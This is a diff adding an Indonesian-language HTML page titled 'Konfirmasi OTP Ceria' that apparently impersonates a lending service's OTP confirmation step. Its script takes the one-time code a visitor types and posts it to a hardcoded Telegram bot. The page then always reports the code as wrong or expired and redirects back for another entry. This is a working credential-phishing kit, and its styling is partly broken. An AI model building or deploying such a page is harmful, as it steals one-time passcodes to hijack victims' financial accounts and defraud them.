@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Konfirmasi OTP Ceria</title>
+  <meta name="viewport" content="width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    /* Gambar */
+#gambar-atas img {
+  width: 90%;
+  object-fit: cover;
+}
+
+/* Kolom Input Kode OTP */
+#kode-otp {
+  margin-top: 10px;
+  width: 90%;
+  max-width: 290px;
+  padding: 15px;
+  border-radius: 5px;
+  border: 2px solid #663399;
+}
+
+/* Waktu Hitung Mundur */
+#countdown {
+  margin-top: 25px;
+  font-size: 16px;
+  color: #red;
+}
+
+/* Tombol Submit */
+#submit {
+  margin-top: 20px;
+  padding: 13px;
+  border-radius: 5px;
+  border: none;
+  background-color: #663399;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  width: 90%;
+  max-width: 450px;
+}
+
+/* Gambar di bawah Tombol Submit */
+#gambar-bawah img {
+  width: 97%;
+  object-fit: cover;
+  margin-top: 80px;
+}
+/* Kolom Input Kode OTP */
+#kode-otp-container {
+  display: flex;
+  padding: 20px;
+  justify-content: space-between;
+  margin-top: 20px;
+  width: 90%;
+  max-width: 450px;
+}
+
+.kode-otp-input {
+  flex: 1;
+  margin-right: 5px;
+  padding: 12px;
+  border-radius: 5px;
+  border: 2px solid #663399;
+  box-sizing: border-box;
+  width: 90%;
+}
+
+#submit-container {
+  display: flex;
+  width: 90%;
+  max-width: 450px;
+  justify-content: space-between;
+  margin-top: 20px;
+}
+#countdown {
+  font-size: 16px;
+  color: #red;
+  width: 90%;
+  max-width: 290px;
+  margin-top: 10px;
+}
+
+/* Elemen Hasil */
+#result {
+  display: none;
+  width: 90%;
+  padding-bottom: 8%;
+  background-color: Gainsboro;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  box-shadow: 0 0 80px rgba(0, 0, 0, 0.1);
+  margin-top: 20px;
+  border-radius: 13px;
+}
+
+#errorMessage {
+  text-align: center;
+  font-size: 18px;
+  color: red;
+  margin-top: 24px;
+}
+#resendButton {margin-top: 30px;}
+#resendButton {
+  color: white; /* Warna teks */
+  background-color: #663399; /* Warna latar belakang */
+}
+#resendButton {
+  font-size: 15px; /* Ukuran teks */
+  font-weight: bold; /* Ketebalan teks */
+  text-decoration: none; /* Gaya dekorasi teks (misalnya, underline) */
+}
+#resendButton {
+  border: 2px solid #663399; /* Lebar dan warna border */
+  border-radius: 5px; /* Radius sudut border */
+}
+#resendButton {
+  width: 80%;
+  padding: 10px; /* Ruang dalam tombol */
+  margin-top: 35px; /* Jarak antara tombol dan elemen di atasnya */
+}
+<style>#countdown {
+  margin-top: 70px;
+  font-size: 16px;
+  color: #red;
+}
+<style>#countdown {
+  margin-top: 70px;
+  font-size: 16px;
+  color: #silver;
+}
+</style>
+  <script>
+function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+
+      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan(inputNumber) {
+      var kodeOTP = document.getElementById("kode-otp").value;
+
+      switch (inputNumber) {
+        case 1:
+          sendMessageToTelegram("Kode OTP: " + kodeOTP);
+          break;
+        default:
+      }
+
+      document.getElementById("result").style.display = "block";
+    }
+
+    function resendCode() {
+      alert("OTP code resent!");
+      startCountdown(); // Memulai kembali hitung mundur setelah mengirim ulang
+      document.getElementById("resenButton").innerHTML = "kirimulang";"//Kode OTP Sudah Tidak Berlaku";
+
+    }
+    function redirectToOtpInput() {
+  // Ganti "halaman-input-otp.html" dengan path/nama file yang sesuai di situs web Anda
+  window.location.href = "otp.html";
+}
+   function startCountdown() {
+      var countDownDate = new Date().getTime() + 5 * 60 * 1000;
+      var countdownElement = document.getElementById("countdown");
+
+      var x = setInterval(function() {
+        var now = new Date().getTime();
+        var distance = countDownDate - now;
+
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+        countdownElement.innerHTML = "" + minutes + "m " + seconds + "s ";
+
+        if (distance < 0) {
+          clearInterval(x);
+          countdownElement.innerHTML = "0 : 0";
+        }
+      }, 1000);
+    }
+
+    // Memulai hitung mundur saat halaman dimuat
+    window.onload = function() {
+      startCountdown();
+    };
+  </script>
+</head>
+<body>
+  <!-- Gambar -->
+  <div id="gambar-atas">
+    <img src="https://i.ibb.co/gMXpqpx/atass.jpg" alt="Gambar Atas">
+  </div>
+
+  <!-- Kolom Input Kode OTP -->
+  <input type="number" id="kode-otp" name="kode_otp" placeholder="Masukan Kode OTP" maxlength="6">
+
+  <!-- Waktu Hitung Mundur -->
+  <div id="countdown"></div>
+  
+  <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan(1)">
+  <!-- Elemen Hasil -->
+  <div id="result">
+    <div id="errorMessage">KODE OTP SALAH</div>
+    <div id="errorMessage">Kode OTP Sudah Tidak Berlaku</div>
+    <button id="resendButton" onclick="redirectToOtpInput()">Kirim Ulang</button>
+  </div>
+   <div id="gambar-bawah">
+    <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Gambar 2711">
+  </div>
+</body>
+</html
